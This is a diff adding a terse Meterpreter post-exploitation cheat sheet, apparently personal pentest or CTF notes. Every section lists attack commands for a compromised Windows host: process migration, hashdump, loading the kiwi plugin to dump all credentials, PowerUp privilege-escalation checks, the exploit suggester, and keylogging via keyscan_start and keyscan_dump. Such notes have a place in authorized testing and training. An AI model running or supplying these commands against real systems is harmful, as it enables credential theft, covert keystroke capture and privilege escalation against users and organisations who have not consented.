@@ -1,0 +1,42 @@
+### meterpreter ###
+> see win/win-enum-meterpreter
+
+
+## utils
+background                                      #put the session in background then sessions -i X
+upload /path/to/file                            #upload
+
+
+## basic recon
+getuid                                          #current user
+getprivs                                        #current privilegs
+sysinfo                                         #sysinfo > check build for vuln
+getpid						#current pid of process where meterpreter is
+ps                                              #process list
+migrate -N spoolsv.exe                          #migrate process with name
+migrate -P id
+hashdump					#get hash after process migration
+search -f flag.txt                              #search file
+
+
+## recon
+load kiwi                                       #load password dumping plugin
+	creds_all                               #get all creds (kiwi)
+load powershell                                 #load powershell plugin -> powershell_shell
+	powershell_shell
+	PS > . .\PowerUp.ps1
+	PS > Invoke-AllChecks
+
+
+## meterpreter pivot exploit
+use exploit/exploit_suggested
+set session 1 && set LHOST xxx
+
+
+## keylogger
+keyscan_start                                   #migrate to word then keylog
+keyscan_stop
+keyscan_dump
+
+
+
